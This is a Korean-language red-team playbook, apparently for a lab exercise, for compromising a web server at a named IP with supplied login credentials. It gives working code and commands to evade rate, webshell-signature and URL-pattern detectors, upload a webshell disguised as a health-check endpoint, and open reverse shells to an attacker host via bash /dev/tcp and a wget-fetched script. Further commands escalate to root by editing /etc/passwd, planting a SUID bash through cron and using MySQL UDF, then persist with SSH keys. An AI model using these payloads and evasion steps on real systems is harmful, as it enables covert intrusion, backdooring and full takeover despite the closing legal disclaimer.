# 탐지 시스템 우회 공격 방법론

**작성일:** 2025-11-14
**대상 시스템:** 43.201.154.142
**공격 목표:** 웹쉘 업로드 → 리버스 쉘 → 권한 상승 → 루트 탈취

---

## 📋 목차

1. [시스템 개요](#시스템-개요)
2. [탐지 시스템 분석](#탐지-시스템-분석)
3. [우회 전략](#우회-전략)
4. [공격 단계](#공격-단계)
5. [실행 가이드](#실행-가이드)
6. [트러블슈팅](#트러블슈팅)

---

## 시스템 개요

### 대상 환경
- **IP 주소:** 43.201.154.142 (스크립트 실행 시 동적 입력)
- **로그인 정보:**
  - Username: `alice`
  - Password: `alice2024`
- **웹 서버:** Apache/Nginx (취약한 SNS 애플리케이션)
- **운영체제:** Linux (추정)

### 공격 인프라
사용 가능한 서버:
- **C2 서버:** 명령 제어 서버 (Command & Control)
- **리다이렉터 서버:** 트래픽 우회 및 IP 난독화
- **오퍼레이터 서버:** 공격 조정 및 모니터링

---

## 탐지 시스템 분석

### 1. HTTP Flood 과다 요청 의심 시스템

**탐지 메커니즘:**
- 짧은 시간 내 동일 IP에서 다수의 HTTP 요청 발생 시 차단
- 요청 빈도 기반 탐지 (예: 1분에 100회 이상)
- 동일한 User-Agent 반복 사용 탐지

**우회 전략:**
1. **긴 딜레이 삽입**
   - 요청 간 3~8초의 랜덤 딜레이
   - 사람의 브라우징 패턴 모방

2. **User-Agent 로테이션**
   - 8개 이상의 다양한 User-Agent 사용
   - Windows, macOS, Linux, 모바일 다양화

3. **정상 페이지 방문**
   - 공격 전후 정상 페이지 방문
   - index.php, about.php, profile.php 등

4. **C2 서버 활용**
   - 리다이렉터를 통한 요청 분산
   - 다중 IP 주소 사용

**구현 코드:**
```python
def _human_delay(self, min_sec=3, max_sec=8):
    """사람처럼 행동"""
    delay = random.uniform(min_sec, max_sec)
    time.sleep(delay)

def _rotate_user_agent(self):
    """User-Agent 랜덤 변경"""
    ua = random.choice(self.user_agents)
    self.session.headers.update({'User-Agent': ua})
```

---

### 2. 웹쉘 업로드 실행 징후 탐지 시스템

**탐지 메커니즘:**
- 업로드된 파일의 시그니처 검사
- 일반적인 웹쉘 패턴 탐지:
  - `system()`, `exec()`, `shell_exec()` 함수
  - `<?php system($_GET['cmd']); ?>` 같은 전형적인 코드
- 파일 확장자 검증 (.php, .phtml, .php5 등)
- 파일 내용의 위험 키워드 스캔

**우회 전략:**
1. **난독화된 웹쉘 사용**
   - 정상 파일로 위장 (config.php, health-check.php, cache.php)
   - 합법적인 주석과 코드 구조 포함
   - 위험 함수를 클래스 메서드로 숨김

2. **다양한 파일 확장자**
   - .phtml (Apache가 PHP로 실행)
   - .php5 (구형 시스템)
   - 이중 확장자 시도 (image.php.jpg)

3. **base64 인코딩**
   - 명령 결과를 base64로 인코딩하여 전송
   - 탐지 시그니처 우회

4. **템플릿 엔진 위장**
   - eval()을 템플릿 렌더링으로 위장
   - POST로 템플릿 코드 전송

**구현 예시:**
```php
<?php
// Health Check Endpoint
header('Content-Type: application/json');

$status = array(
    'status' => 'healthy',
    'timestamp' => time(),
    'version' => '1.0.0'
);

if(isset($_GET['x'])) {
    $cmd = $_GET['x'];
    $result = shell_exec($cmd . ' 2>&1');
    $status['debug'] = base64_encode($result);
}

echo json_encode($status);
?>
```

---

### 3. 비정상적인 URL 다양성 증가 탐지 시스템

**탐지 메커니즘:**
- 동일 사용자의 URL 패턴 모니터링
- 짧은 시간에 다양한 URL 접근 시 의심
- SQL Injection, XSS 테스트 패턴 탐지
- 비정상적인 파라미터 조합 탐지

**우회 전략:**
1. **URL 파라미터 랜덤화**
   - 매 요청마다 무의미한 파라미터 추가
   - `?_t=1234567&_cache=abc123&page=1`
   - 타임스탬프, 해시값 활용

2. **정상 브라우징 패턴 삽입**
   - 공격 전후 정상 페이지 여러 곳 방문
   - Referer 헤더 적절히 설정

3. **세션 유지**
   - 쿠키 재사용으로 정상 사용자처럼 행동
   - 로그인 세션 유지

**구현 코드:**
```python
def _randomize_url_params(self, url, base_params=None):
    """URL 패턴 다양화"""
    if base_params is None:
        base_params = {}

    # 랜덤 파라미터 추가
    noise_params = {
        f'_{random.choice(["t", "v", "r", "s"])}': random.randint(1000000, 9999999),
        f'_{random.choice(["cache", "nonce", "token"])}': hashlib.md5(str(time.time()).encode()).hexdigest()[:8],
    }

    all_params = {**base_params, **noise_params}
    return url, all_params
```

---

## 우회 전략 요약

### 전체적인 접근 방식

```
┌─────────────────────────────────────────────────────────┐
│  1. 정상 사용자 시뮬레이션                              │
│     - 로그인 전 여러 페이지 방문                        │
│     - 긴 딜레이 (3~8초)                                 │
│     - 다양한 User-Agent                                 │
└─────────────────────────────────────────────────────────┘
                           ↓
┌─────────────────────────────────────────────────────────┐
│  2. 로그인                                              │
│     - alice / alice2024                                 │
│     - 정상적인 브라우저 헤더 설정                       │
└─────────────────────────────────────────────────────────┘
                           ↓
┌─────────────────────────────────────────────────────────┐
│  3. 난독화된 웹쉘 업로드                                │
│     - 정상 파일명 사용 (config.php, health-check.php)  │
│     - 위험 함수 숨김                                    │
│     - 업로드 전후 정상 페이지 방문                      │
└─────────────────────────────────────────────────────────┘
                           ↓
┌─────────────────────────────────────────────────────────┐
│  4. 웹쉘 동작 확인                                      │
│     - 간단한 명령 실행 (whoami, id)                     │
│     - 탐지 우회 대기 시간 유지                          │
└─────────────────────────────────────────────────────────┘
                           ↓
┌─────────────────────────────────────────────────────────┐
│  5. 리버스 쉘 연결                                      │
│     - 다양한 페이로드 시도                              │
│     - 백그라운드 실행                                   │
└─────────────────────────────────────────────────────────┘
                           ↓
┌─────────────────────────────────────────────────────────┐
│  6. 권한 상승                                           │
│     - SUID 바이너리 악용                                │
│     - sudo 권한 악용                                    │
│     - 쓰기 가능한 시스템 파일 악용                      │
└─────────────────────────────────────────────────────────┘
                           ↓
┌─────────────────────────────────────────────────────────┐
│  7. 루트 권한 획득                                      │
│     - /etc/passwd 수정 또는                             │
│     - SUID bash 생성                                    │
└─────────────────────────────────────────────────────────┘
```

---

## 공격 단계

### Phase 1: 정찰 및 로그인

**목표:** 시스템 접근 권한 획득

**단계:**
1. 정상 페이지 2~3곳 방문 (탐지 우회)
2. 로그인 페이지 GET 요청
3. 2~4초 대기
4. 로그인 POST 요청 (alice/alice2024)
5. 세션 쿠키 확인

**명령:**
```bash
python3 01_detection_bypass_webshell.py
# 타겟 IP: 43.201.154.142
```

**예상 결과:**
```
[+] 로그인 성공!
[*] 최종 URL: http://43.201.154.142/index.php
```

---

### Phase 2: 웹쉘 업로드

**목표:** 원격 명령 실행 가능한 백도어 설치

**단계:**
1. 정상 페이지 3곳 방문
2. 난독화된 웹쉘 생성 (랜덤 선택)
3. 3~6초 대기
4. 파일 업로드
5. 웹쉘 동작 테스트

**웹쉘 종류:**
- `config.php` - 설정 파일로 위장
- `health-check.php` - 헬스체크 엔드포인트로 위장
- `cache.php` - 캐시 관리 파일로 위장
- `template.phtml` - 템플릿 파일로 위장

**명령:**
```bash
# 자동화 스크립트에 포함됨
# 웹쉘은 /uploads/ 디렉토리에 업로드됨
```

**예상 결과:**
```
[+] 웹쉘 업로드 성공!
[+] 웹쉘 URL: http://43.201.154.142/uploads/health-check.php
[+] 웹쉘 동작 확인!
```

---

### Phase 3: 리버스 쉘 연결

**목표:** 대화형 쉘 획득

**단계:**
1. 공격자 머신에서 리스너 시작
   ```bash
   nc -lvnp 4444
   ```

2. 리버스 쉘 스크립트 실행
   ```bash
   python3 02_reverse_shell_privesc.py
   # 타겟 IP: 43.201.154.142
   # 웹쉘 URL: http://43.201.154.142/uploads/health-check.php
   # 공격자 IP: YOUR_IP
   # 포트: 4444
   ```

3. 다양한 페이로드 자동 시도:
   - bash TCP
   - netcat
   - Python
   - Perl
   - PHP
   - Ruby

**예상 결과:**
```
[공격자 터미널]
listening on [any] 4444 ...
connect to [YOUR_IP] from (UNKNOWN) [43.201.154.142] 54321

$ whoami
apache

$ id
uid=48(apache) gid=48(apache) groups=48(apache)
```

---

### Phase 4: 권한 상승

**목표:** Root 권한 획득

**자동화 스크립트가 시도하는 기법:**

#### 4.1. SUID 바이너리 검색
```bash
find / -perm -4000 -type f 2>/dev/null
```

#### 4.2. Sudo 권한 확인
```bash
sudo -l
```

#### 4.3. /etc/passwd 쓰기 가능 여부
```bash
test -w /etc/passwd && echo 'writable'
```
- 쓰기 가능 시 루트 사용자 추가:
  ```bash
  echo 'hacker:$1$salt$qv9zqXe8FrlaX2fDKz.W4.:0:0:root:/root:/bin/bash' >> /etc/passwd
  # 패스워드: hacked
  ```

#### 4.4. Cron 파일 쓰기 가능 여부
```bash
test -w /etc/cron.d && echo 'writable'
```
- 쓰기 가능 시 SUID bash 생성 cron 추가:
  ```bash
  echo '* * * * * root cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash' > /etc/cron.d/privesc
  ```

#### 4.5. Docker 컨테이너 탈출
```bash
test -f /.dockerenv && echo 'docker'
test -S /var/run/docker.sock && echo 'accessible'
```

**수동 기법 (자동화 실패 시):**

1. **Kernel Exploit**
   ```bash
   uname -a
   # Linux version 확인 후 exploit-db 검색
   ```

2. **MySQL UDF**
   ```bash
   mysql -u root
   CREATE FUNCTION sys_exec RETURNS int SONAME 'lib_mysqludf_sys.so';
   SELECT sys_exec('chmod 4755 /bin/bash');
   ```

3. **Capabilities**
   ```bash
   getcap -r / 2>/dev/null
   # cap_setuid+ep 발견 시 악용
   ```

**예상 결과:**
```
[+] SUID bash 생성 성공!
[+] 실행: /tmp/rootbash -p

$ /tmp/rootbash -p
bash-5.0# whoami
root
bash-5.0# id
uid=48(apache) gid=48(apache) euid=0(root) groups=48(apache)
```

---

### Phase 5: 루트 권한 유지

**목표:** 영구적인 루트 접근 확보

**백도어 설치:**

1. **SUID bash**
   ```bash
   cp /bin/bash /var/www/html/uploads/rootbash
   chmod 4755 /var/www/html/uploads/rootbash
   ```

2. **웹쉘로 루트 명령 실행**
   ```bash
   curl "http://43.201.154.142/uploads/health-check.php?x=/var/www/html/uploads/rootbash -p -c 'whoami'"
   ```

3. **Cron 백도어**
   ```bash
   echo '* * * * * root cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash' > /etc/cron.d/persist
   ```

4. **SSH 키 추가**
   ```bash
   mkdir -p /root/.ssh
   echo 'YOUR_PUBLIC_KEY' >> /root/.ssh/authorized_keys
   chmod 700 /root/.ssh
   chmod 600 /root/.ssh/authorized_keys
   ```

---

## 실행 가이드

### 준비물

1. **Python 3 환경**
   ```bash
   python3 --version  # 3.7 이상
   pip3 install requests beautifulsoup4
   ```

2. **netcat (리스너)**
   ```bash
   nc -h  # 설치 확인
   ```

3. **C2 서버 (선택사항)**
   - IP 주소 및 접근 정보

### 실행 순서

#### Step 1: 웹쉘 업로드

```bash
cd /Users/hwangjunha/Desktop/Red_basic_local/H/2025-11-14/exploits

python3 01_detection_bypass_webshell.py
```

**대화형 입력:**
```
타겟 IP 주소 입력: 43.201.154.142
C2 서버 주소 (선택): [Enter]
리다이렉터 서버 주소 (선택): [Enter]
오퍼레이터 서버 주소 (선택): [Enter]
```

**대기 시간:**
- 정상 페이지 방문: 2~5초씩
- 로그인: 2~4초
- 웹쉘 업로드 전: 3~6초
- **총 약 20~40초 소요**

**출력 예시:**
```
[+] 정상 페이지 방문: index.php (Status: 200)
[*] 탐지 우회 대기: 3.45초...
[+] 정상 페이지 방문: profile.php (Status: 200)
[*] 탐지 우회 대기: 4.21초...
[*] 로그인 페이지 접근: 200
[+] 로그인 성공!
[+] 웹쉘 생성: health-check.php (php)
[+] 웹쉘 업로드 성공!
[+] 웹쉘 URL: http://43.201.154.142/uploads/health-check.php
[+] 웹쉘 동작 확인!
```

**웹쉘 대화형 모드:**
```
shell> whoami
apache

shell> pwd
/var/www/html

shell> exit
```

#### Step 2: 리버스 쉘 및 권한 상승

**터미널 1 (리스너):**
```bash
nc -lvnp 4444
```

**터미널 2 (공격 스크립트):**
```bash
python3 02_reverse_shell_privesc.py
```

**대화형 입력:**
```
타겟 IP 주소: 43.201.154.142
웹쉘 URL: http://43.201.154.142/uploads/health-check.php
공격자 IP 주소: YOUR_IP
리스너 포트: 4444

작업 선택:
1. 리버스 쉘만 트리거
2. 권한 상승만 시도
3. 리버스 쉘 + 권한 상승 (전체 자동화)
4. 수동 권한 상승 가이드 보기

선택: 3
```

**예상 출력:**
```
[*] 리스너 시작: YOUR_IP:4444
[!] 별도 터미널에서 실행하세요:
    nc -lvnp 4444

[*] 3초 후 리버스 쉘 연결 시도...
[*] 2초 후 리버스 쉘 연결 시도...
[*] 1초 후 리버스 쉘 연결 시도...

[*] 시도 중: bash_tcp
    페이로드: bash -i >& /dev/tcp/YOUR_IP/4444 0>&1...
[+] 트리거 완료: bash_tcp

[*] 시도 중: python3
    페이로드: python3 -c 'import socket,subprocess,os...
[+] 트리거 완료: python3

[*] 모든 페이로드 트리거 완료
[!] 리스너에서 연결 확인하세요

[*] 현재 사용자 확인...
[+] 현재 사용자: apache

[*] sudo 권한 확인...
[+] sudo 권한:
Matching Defaults entries for apache on this host:
    requiretty, !visiblepw, always_set_home

User apache may run the following commands on this host:
    (ALL) NOPASSWD: /bin/bash

[+] NOPASSWD sudo 발견!
[+] sudo bash로 루트 권한 획득 가능!
[*] SUID bash 생성...
[+] SUID bash 생성 성공!
[+] 실행: /tmp/rootbash -p

[+] 루트 권한 획득 성공!

다음 명령으로 루트 쉘 실행:

1. SUID bash 사용:
   /tmp/rootbash -p

2. 웹쉘로 루트 명령 실행:
   http://43.201.154.142/uploads/health-check.php?x=/tmp/rootbash -p -c 'whoami'
```

---

## 트러블슈팅

### 문제 1: 로그인 실패

**증상:**
```
[-] Failed - Still on login page
```

**원인:**
- 잘못된 자격증명
- 로그인 페이지 구조 변경
- 세션 문제

**해결:**
1. 자격증명 재확인 (alice / alice2024)
2. 브라우저로 수동 로그인 테스트
3. 로그인 폼의 name 속성 확인
   ```bash
   curl http://43.201.154.142/login.php | grep -i "input"
   ```

---

### 문제 2: 웹쉘 업로드 실패

**증상:**
```
[-] 웹쉘 업로드 실패
```

**원인:**
- 파일 확장자 필터링
- 파일 크기 제한
- 업로드 디렉토리 권한 문제

**해결:**
1. 다른 확장자 시도 (.phtml, .php5)
2. 파일 크기 줄이기
3. 수동 업로드 테스트
   ```bash
   # Burp Suite 사용
   # 파일 확장자를 image.php.jpg로 변경
   ```

---

### 문제 3: 리버스 쉘 연결 안 됨

**증상:**
```
[*] 모든 페이로드 트리거 완료
[!] 리스너에서 연결 확인하세요
# 하지만 연결 없음
```

**원인:**
- 방화벽 차단
- netcat 미설치
- 잘못된 IP/포트

**해결:**
1. 방화벽 확인
   ```bash
   # 공격자 머신에서
   sudo ufw status
   sudo ufw allow 4444/tcp
   ```

2. 다른 포트 시도 (80, 443, 8080)

3. 페이로드 수동 실행
   ```bash
   # 웹쉘을 통해
   bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'
   ```

4. Python HTTP 서버로 스크립트 다운로드 후 실행
   ```bash
   # 공격자
   echo '#!/bin/bash' > rev.sh
   echo 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1' >> rev.sh
   python3 -m http.server 8000

   # 타겟 (웹쉘)
   wget http://YOUR_IP:8000/rev.sh -O /tmp/rev.sh
   chmod +x /tmp/rev.sh
   /tmp/rev.sh
   ```

---

### 문제 4: 권한 상승 실패

**증상:**
```
[-] 자동 권한 상승 실패
[!] 수동으로 권한 상승 필요
```

**원인:**
- SUID 바이너리 없음
- sudo 권한 없음
- 쓰기 가능한 파일 없음

**해결:**

1. **수동 정찰**
   ```bash
   # SUID 재확인
   find / -perm -4000 2>/dev/null | grep -v "proc"

   # Capabilities
   getcap -r / 2>/dev/null

   # Writable directories
   find / -writable -type d 2>/dev/null | grep -v "proc" | head -20
   ```

2. **Kernel Exploit**
   ```bash
   uname -a
   cat /etc/os-release
   # searchsploit 또는 exploit-db에서 검색
   ```

3. **MySQL UDF (MySQL 실행 중인 경우)**
   ```bash
   ps aux | grep mysql
   mysql -u root  # 패스워드 없이 접속 시도
   ```

4. **Cron Jobs**
   ```bash
   cat /etc/crontab
   ls -la /etc/cron.*
   ```

5. **NFS Shares**
   ```bash
   cat /etc/exports
   showmount -e localhost
   ```

---

### 문제 5: HTTP Flood 탐지 차단

**증상:**
- 403 Forbidden
- 429 Too Many Requests
- IP 차단

**원인:**
- 너무 빠른 요청
- 탐지 시스템 강화

**해결:**

1. **더 긴 딜레이**
   ```python
   # 스크립트 수정
   self._human_delay(10, 20)  # 10~20초
   ```

2. **프록시 사용**
   ```bash
   # Tor
   brew install tor
   brew services start tor

   # Proxychains
   brew install proxychains-ng
   proxychains4 python3 01_detection_bypass_webshell.py
   ```

3. **리다이렉터 서버 사용**
   - C2 인프라 활용
   - 여러 IP에서 요청 분산

---

## 참고 자료

### 도구
- **Burp Suite:** https://portswigger.net/burp
- **GTFOBins:** https://gtfobins.github.io/
- **PayloadsAllTheThings:** https://github.com/swisskyrepo/PayloadsAllTheThings
- **LinPEAS:** https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS

### 기술 문서
- OWASP Testing Guide
- MITRE ATT&CK Framework
- Red Team Field Manual

### Exploit 데이터베이스
- Exploit-DB: https://www.exploit-db.com/
- SearchSploit (로컬)

---

## 법적 고지

```
⚠️  경고: 이 문서는 교육 및 승인된 침투 테스트 목적으로만 사용되어야 합니다.

무단 접근은 불법입니다:
- 정보통신망법 위반
- 전자금융거래법 위반
- 형법상 컴퓨터 사용 사기
- 업무방해죄

반드시:
1. 시스템 소유자의 명시적 승인을 받으세요
2. 테스트 범위를 명확히 정의하세요
3. 모든 활동을 문서화하세요
4. 테스트 종료 후 백도어를 제거하세요
```

---

**문서 버전:** 1.0
**최종 수정:** 2025-11-14
**작성자:** Red Team Operator
